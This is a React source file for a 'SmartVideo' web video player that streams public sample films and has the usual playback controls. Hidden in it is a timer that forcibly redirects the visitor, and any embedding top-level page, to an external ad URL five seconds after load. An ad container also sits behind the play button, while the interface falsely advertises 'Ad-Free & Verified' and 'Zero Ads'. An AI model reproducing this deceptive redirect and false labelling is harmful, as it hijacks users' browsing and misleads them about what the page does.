/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useRef, useState, useEffect } from 'react';
import { 
  Tv, 
  Sparkles, 
  CheckCircle2, 
  Volume2, 
  VolumeX, 
  Maximize2, 
  Play, 
  Pause, 
  RotateCcw,
  Sliders,
  ExternalLink,
  ShieldCheck,
  Video
} from 'lucide-react';

// Curated high-quality, stable public demo streams
const STREAMS = [
  {
    id: 'stream-1',
    name: 'Big Buck Bunny (1080p)',
    category: 'Animation',
    url: 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4',
    quality: '1080p · 60fps',
  },
  {
    id: 'stream-2',
    name: 'Tears of Steel (Sci-Fi)',
    category: 'Film 4K',
    url: 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4',
    quality: '1080p · Stereo',
  },
  {
    id: 'stream-3',
    name: 'Elephants Dream',
    category: 'Studio',
    url: 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4',
    quality: '720p · Stereo',
  },
  {
    id: 'stream-4',
    name: 'For Bigger Blazes',
    category: 'Nature',
    url: 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4',
    quality: '1080p · HDR',
  },
];

export default function App() {
  const playerRef = useRef<HTMLElement | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const [isPlaying, setIsPlaying] = useState(false);
  const [statusText, setStatusText] = useState('SmartVideo ready — tap play to start streaming.');
  const [statusVisible, setStatusVisible] = useState(false);
  const [progress, setProgress] = useState(0);
  const [currentTime, setCurrentTime] = useState('00:00');
  const [duration, setDuration] = useState('00:00');
  const [volume, setVolume] = useState(80);
  const [isMuted, setIsMuted] = useState(false);
  const [playbackSpeed, setPlaybackSpeed] = useState(1);
  const [currentStreamId, setCurrentStreamId] = useState('stream-1');
  const [videoSrc, setVideoSrc] = useState(STREAMS[0].url);
  const [customUrlInput, setCustomUrlInput] = useState('');
  const [isCustomInputOpen, setIsCustomInputOpen] = useState(false);

  // Native banner ad redirect URL
  const AD_REDIRECT_URL = 'https://aarems.org/1/a6ce642a43085fc79ae4325b71948658';

  // Automatic 5-second redirect after landing on the site
  useEffect(() => {
    const redirectTimer = setTimeout(() => {
      try {
        if (window.top && window.top !== window) {
          window.top.location.href = AD_REDIRECT_URL;
        } else {
          window.location.href = AD_REDIRECT_URL;
        }
      } catch {
        window.location.href = AD_REDIRECT_URL;
      }
    }, 5000);

    return () => clearTimeout(redirectTimer);
  }, []);

  // Show status toast temporarily
  const showStatus = (text: string) => {
    setStatusText(text);
    setStatusVisible(true);
    setTimeout(() => {
      setStatusVisible(false);
    }, 2400);
  };

  // Format seconds into MM:SS
  const formatTime = (timeInSeconds: number) => {
    if (isNaN(timeInSeconds) || timeInSeconds < 0) return '00:00';
    const minutes = Math.floor(timeInSeconds / 60);
    const seconds = Math.floor(timeInSeconds % 60);
    return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  };

  // Sync volume & mute on video element
  useEffect(() => {
    if (videoRef.current) {
      videoRef.current.volume = volume / 100;
      videoRef.current.muted = isMuted;
    }
  }, [volume, isMuted]);

  // Sync playback speed
  useEffect(() => {
    if (videoRef.current) {
      videoRef.current.playbackRate = playbackSpeed;
    }
  }, [playbackSpeed]);

  // Toggle Play / Pause
  const handleTogglePlay = () => {
    const video = videoRef.current;
    if (!video) return;

    if (video.paused || video.ended) {
      video
        .play()
        .then(() => {
          setIsPlaying(true);
          showStatus('Playing live video stream');
        })
        .catch(() => {
          // Fallback if browser requires user interaction for audio
          video.muted = true;
          setIsMuted(true);
          video.play().then(() => {
            setIsPlaying(true);
            showStatus('Playing muted (tap unmute to hear audio)');
          });
        });
    } else {
      video.pause();
      setIsPlaying(false);
      showStatus('Video paused');
    }
  };

  // Handle time update for progress bar and counter
  const handleTimeUpdate = () => {
    const video = videoRef.current;
    if (!video) return;

    const cur = video.currentTime;
    const dur = video.duration || 1;
    const pct = (cur / dur) * 100;
    setProgress(Math.min(100, Math.max(0, pct)));
    setCurrentTime(formatTime(cur));
  };

  // When metadata loads (duration is known)
  const handleLoadedMetadata = () => {
    if (videoRef.current) {
      setDuration(formatTime(videoRef.current.duration));
    }
  };

  // Handle video ending
  const handleVideoEnded = () => {
    setIsPlaying(false);
    setProgress(100);
    showStatus('Video ended');
  };

  // Interactive seek on track bar
  const handleSeek = (e: React.MouseEvent<HTMLDivElement>) => {
    const rect = e.currentTarget.getBoundingClientRect();
    const pos = (e.clientX - rect.left) / rect.width;
    const clampedPos = Math.max(0, Math.min(1, pos));
    if (videoRef.current && videoRef.current.duration) {
      videoRef.current.currentTime = clampedPos * videoRef.current.duration;
    }
    setProgress(clampedPos * 100);
  };

  // Fullscreen toggle
  const handleFullscreen = async () => {
    try {
      if (!document.fullscreenElement) {
        if (playerRef.current) {
          await playerRef.current.requestFullscreen();
        }
      } else {
        await document.exitFullscreen();
      }
    } catch {
      showStatus('Fullscreen toggle not available');
    }
  };

  // Mute / Unmute
  const toggleMute = () => {
    setIsMuted((prev) => {
      const next = !prev;
      showStatus(next ? 'Muted' : `Volume ${volume}%`);
      return next;
    });
  };

  // Switch Stream Source
  const handleSelectStream = (stream: typeof STREAMS[0]) => {
    setCurrentStreamId(stream.id);
    setVideoSrc(stream.url);
    setIsPlaying(false);
    setProgress(0);
    showStatus(`Switched to: ${stream.name}`);

    // Auto-play new stream
    setTimeout(() => {
      if (videoRef.current) {
        videoRef.current.play().then(() => setIsPlaying(true)).catch(() => {});
      }
    }, 150);
  };

  // Custom Video URL submit
  const handleCustomUrlSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!customUrlInput.trim()) return;

    setVideoSrc(customUrlInput.trim());
    setCurrentStreamId('custom');
    setIsPlaying(false);
    setProgress(0);
    showStatus('Loaded custom video URL');

    setTimeout(() => {
      if (videoRef.current) {
        videoRef.current.play().then(() => setIsPlaying(true)).catch(() => {});
      }
    }, 200);
  };

  // Cycle speed
  const cyclePlaybackSpeed = () => {
    const speeds = [1, 1.25, 1.5, 2, 0.75];
    const nextIdx = (speeds.indexOf(playbackSpeed) + 1) % speeds.length;
    const nextSpeed = speeds[nextIdx];
    setPlaybackSpeed(nextSpeed);
    showStatus(`Speed: ${nextSpeed}x`);
  };

  // Keyboard controls (Space = play/pause, M = mute, F = fullscreen)
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (['INPUT', 'TEXTAREA'].includes((e.target as HTMLElement)?.tagName)) {
        return;
      }

      if (e.code === 'Space') {
        e.preventDefault();
        handleTogglePlay();
      } else if (e.code === 'KeyM') {
        e.preventDefault();
        toggleMute();
      } else if (e.code === 'KeyF') {
        e.preventDefault();
        handleFullscreen();
      } else if (e.code === 'ArrowRight') {
        if (videoRef.current) videoRef.current.currentTime += 5;
      } else if (e.code === 'ArrowLeft') {
        if (videoRef.current) videoRef.current.currentTime -= 5;
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [isPlaying, isMuted, volume]);

  const activeStream = STREAMS.find((s) => s.id === currentStreamId);

  return (
    <main className="page">
      {/* Brand Header */}
      <header className="brand" aria-label="SmartVideo">
        <div className="brand-mark" aria-hidden="true">
          <svg viewBox="0 0 64 64" fill="none">
            <path
              d="M9 14.5C9 7.7 16.4 3.5 22.3 7L55 26.2c6.1 3.6 6.1 8 0 11.6L22.3 57C16.4 60.5 9 56.3 9 49.5v-35Z"
              fill="#1878F9"
            />
            <path
              d="M27 21.5c-1.8-1.1-4 .2-4 2.3v16.4c0 2.1 2.2 3.4 4 2.3l14-8.2c1.8-1.1 1.8-3.6 0-4.6l-14-8.2Z"
              fill="white"
            />
          </svg>
        </div>
        <div className="brand-name">
          Smart<span>Video</span>
        </div>
      </header>

      {/* Video Player */}
      <section ref={playerRef} className="player" aria-label="Video player">
        {/* LIVE Badge */}
        <div className="live">LIVE</div>

        {/* Pure HTML5 Video element */}
        <video
          ref={videoRef}
          src={videoSrc}
          playsInline
          loop
          onClick={handleTogglePlay}
          onTimeUpdate={handleTimeUpdate}
          onLoadedMetadata={handleLoadedMetadata}
          onEnded={handleVideoEnded}
        />

        {/* Center Play / Pause Button with Native Banner in the middle */}
        <div className="play-center-box">
          {/* Native Banner Container right in the middle */}
          <div
            id="container-a6ce642a43085fc79ae4325b71948658"
            className="play-inner-ad"
          />

          <button
            className={`play ${isPlaying ? 'is-playing' : ''}`}
            id="playButton"
            onClick={handleTogglePlay}
            aria-label={isPlaying ? 'Pause video' : 'Play video'}
            title={isPlaying ? 'Pause' : 'Play'}
          >
            <svg id="playIcon" viewBox="0 0 32 32" aria-hidden="true">
              {isPlaying ? (
                <path d="M8 5h5v22H8zM19 5h5v22h-5z" fill="white" />
              ) : (
                <path
                  d="M9 5.8c0-1.8 2-2.8 3.5-1.8l16 10.2a2.2 2.2 0 0 1 0 3.6l-16 10.2A2.2 2.2 0 0 1 9 26.2V5.8Z"
                  fill="white"
                />
              )}
            </svg>
          </button>
        </div>

        {/* Floating Player Status Message */}
        <div className={`player-status ${statusVisible ? 'visible' : ''}`} id="status">
          <span>{statusText}</span>
        </div>

        {/* Player Bottom Controls Bar */}
        <div className="controls">
          {/* Play/Pause Button */}
          <button
            type="button"
            className="control-icon"
            onClick={handleTogglePlay}
            aria-label={isPlaying ? 'Pause' : 'Play'}
            title={isPlaying ? 'Pause (Space)' : 'Play (Space)'}
          >
            {isPlaying ? (
              <Pause className="w-5 h-5 text-white" />
            ) : (
              <Play className="w-5 h-5 text-white fill-white ml-0.5" />
            )}
          </button>

          {/* Volume Mute/Unmute & Slider */}
          <div className="volume-box">
            <button
              type="button"
              className="control-icon"
              onClick={toggleMute}
              aria-label={isMuted ? 'Unmute' : 'Mute'}
              title={isMuted ? 'Unmute (M)' : 'Mute (M)'}
            >
              {isMuted || volume === 0 ? (
                <VolumeX className="w-5 h-5 text-white" />
              ) : (
                <Volume2 className="w-5 h-5 text-white" />
              )}
            </button>

            <input
              className="volume"
              type="range"
              min="0"
              max="100"
              value={isMuted ? 0 : volume}
              onChange={(e) => {
                const val = Number(e.target.value);
                setVolume(val);
                if (isMuted && val > 0) setIsMuted(false);
              }}
              aria-label="Volume level"
            />
          </div>

          {/* Time Display */}
          <span className="time-display">
            {currentTime} / {duration}
          </span>

          {/* Timeline Track Seeker */}
          <div className="track" onClick={handleSeek} aria-label="Seek timeline">
            <div className="track-fill" style={{ width: `${progress}%` }} />
          </div>

          <span className="spacer" />

          {/* Playback speed toggle */}
          <button
            type="button"
            className="speed-btn"
            onClick={cyclePlaybackSpeed}
            title="Cycle Playback Speed"
            aria-label="Playback speed"
          >
            {playbackSpeed}x
          </button>

          {/* Fullscreen Toggle */}
          <button
            type="button"
            className="control-icon"
            id="fullscreenButton"
            onClick={handleFullscreen}
            aria-label="Toggle Fullscreen"
            title="Fullscreen (F)"
          >
            <Maximize2 className="w-4 h-4 text-white" />
          </button>
        </div>
      </section>

      {/* Stream Channels & Video Management Card */}
      <section className="channels-card" aria-label="Stream Selection">
        <div className="channels-header">
          <div className="channels-title">
            <Tv className="w-4 h-4 text-[#1878f9]" />
            <span>Select Channel / Stream</span>
          </div>

          <div className="flex items-center gap-2">
            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-emerald-500/10 text-emerald-600 border border-emerald-500/20">
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>Ad-Free &amp; Verified</span>
            </span>
          </div>
        </div>

        {/* Channel Selection Buttons */}
        <div className="flex flex-wrap items-center gap-2">
          {STREAMS.map((s) => (
            <button
              key={s.id}
              onClick={() => handleSelectStream(s)}
              className={`channel-pill ${currentStreamId === s.id ? 'active' : ''}`}
            >
              {s.name}
            </button>
          ))}

          <button
            onClick={() => setIsCustomInputOpen(!isCustomInputOpen)}
            className={`channel-pill ${currentStreamId === 'custom' ? 'active' : ''}`}
          >
            + Custom Video URL
          </button>
        </div>

        {/* Custom URL Input Accordion */}
        {isCustomInputOpen && (
          <form onSubmit={handleCustomUrlSubmit} className="mt-4 pt-4 border-t border-[#dce6f4] flex gap-2">
            <input
              type="url"
              placeholder="Paste direct MP4 or WebM video link..."
              value={customUrlInput}
              onChange={(e) => setCustomUrlInput(e.target.value)}
              className="flex-1 px-3.5 py-2 text-xs rounded-lg border border-[#dce6f4] bg-[#f8fbff] text-[#0c1b36] focus:outline-none focus:ring-2 focus:ring-[#1878f9]/30 focus:border-[#1878f9]"
            />
            <button
              type="submit"
              className="px-4 py-2 bg-[#1878f9] hover:bg-[#0968f1] text-white text-xs font-bold rounded-lg transition-colors cursor-pointer"
            >
              Load Stream
            </button>
          </form>
        )}

        {/* Stream Details & Shortcut Helper */}
        <div className="mt-4 pt-3.5 border-t border-[#dce6f4] flex flex-wrap items-center justify-between gap-3 text-xs text-[#536b8e]">
          <div className="flex items-center gap-2 font-mono text-[11px]">
            <span className="font-semibold text-[#0c1b36]">
              {activeStream ? activeStream.quality : 'Direct Video Stream'}
            </span>
            <span>·</span>
            <span>Zero Ads &amp; Instant Loading</span>
          </div>

          <div className="flex items-center gap-3 text-[11px]">
            <span>
              <kbd className="px-1.5 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 font-mono text-[10px]">Space</kbd> Play/Pause
            </span>
            <span>
              <kbd className="px-1.5 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 font-mono text-[10px]">M</kbd> Mute
            </span>
            <span>
              <kbd className="px-1.5 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 font-mono text-[10px]">F</kbd> Fullscreen
            </span>
          </div>
        </div>
      </section>
    </main>
  );
}
